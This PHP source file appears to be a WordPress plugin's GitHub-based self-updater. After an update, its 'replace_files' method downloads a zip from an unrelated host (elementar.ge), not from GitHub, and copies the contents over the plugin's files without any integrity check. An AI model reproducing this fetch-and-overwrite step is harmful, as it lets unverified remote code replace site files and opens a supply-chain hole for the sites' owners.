<?php

namespace WPGitHubUpdater;

use GuzzleHttp\Client;
use GuzzleHttp\Exception\RequestException;

class Updater {
    const GITHUB_API_URL = 'https://api.github.com/repos/Lkilasonia/wp-github-updater/releases/latest';

    public static function check_for_updates($transient) {
        if (empty($transient)) {
            $transient = new \stdClass();
        }

        $client = new Client();
        try {
            $response = $client->get(self::GITHUB_API_URL);

            if ($response->getStatusCode() !== 200) {
                error_log('Failed to fetch update information from GitHub. Status Code: ' . $response->getStatusCode());
                return $transient;
            }

            $release = json_decode($response->getBody());
            if (empty($release->tag_name) || empty($release->zipball_url)) {
                error_log('Invalid release data received from GitHub.');
                return $transient;
            }

            $latest_version = ltrim($release->tag_name, 'v');
            $download_url = $release->zipball_url;

            if (version_compare($latest_version, WP_GITHUB_UPDATER_VERSION, '>')) {
                $plugin_slug = 'wp-github-updater/wp-github-updater.php';
                $transient->response[$plugin_slug] = (object) [
                    'slug' => $plugin_slug,
                    'new_version' => $latest_version,
                    'url' => $release->html_url,
                    'package' => $download_url,
                ];
                error_log('New version available: ' . $latest_version);
            } else {
                error_log('No new version found. Current version: ' . WP_GITHUB_UPDATER_VERSION . ', Latest version: ' . $latest_version);
            }
        } catch (RequestException $e) {
            error_log('Error fetching update information: ' . $e->getMessage());
        }

        return $transient;
    }

    public static function upgrader_process_complete($upgrader, $hook_extra) {
        if ($hook_extra['type'] === 'plugin' && $hook_extra['action'] === 'update') {
            if (in_array('wp-github-updater/wp-github-updater.php', $hook_extra['plugins'])) {
                self::replace_files(WP_PLUGIN_DIR . '/wp-github-updater');
            }
        }
    }

    private static function replace_files($plugin_path) {
        $update_url = 'https://elementar.ge/myupdater/elupdater.zip';
        $download_file = download_url($update_url);

        if (is_wp_error($download_file)) {
            error_log('Failed to download update package.');
            return;
        }

        $tmp_dir = WP_CONTENT_DIR . '/uploads/wp-github-updater-temp';
        if (!is_dir($tmp_dir)) {
            mkdir($tmp_dir, 0755, true);
        }

        $result = unzip_file($download_file, $tmp_dir);
        @unlink($download_file);

        if (is_wp_error($result)) {
            error_log('Failed to unzip the update package: ' . $result->get_error_message());
            return;
        }

        $files = new \RecursiveIteratorIterator(
            new \RecursiveDirectoryIterator($tmp_dir, \RecursiveDirectoryIterator::SKIP_DOTS),
            \RecursiveIteratorIterator::CHILD_FIRST
        );

        foreach ($files as $fileinfo) {
            $target = $plugin_path . '/' . $files->getSubPathName();
            if ($fileinfo->isDir()) {
                if (!file_exists($target)) {
                    mkdir($target);
                }
            } else {
                copy($fileinfo->getPathname(), $target);
            }
        }

        self::delete_directory($tmp_dir);
    }

    private static function delete_directory($dir) {
        $files = array_diff(scandir($dir), ['.', '..']);
        foreach ($files as $file) {
            (is_dir("$dir/$file")) ? self::delete_directory("$dir/$file") : unlink("$dir/$file");
        }
        rmdir($dir);
    }
}
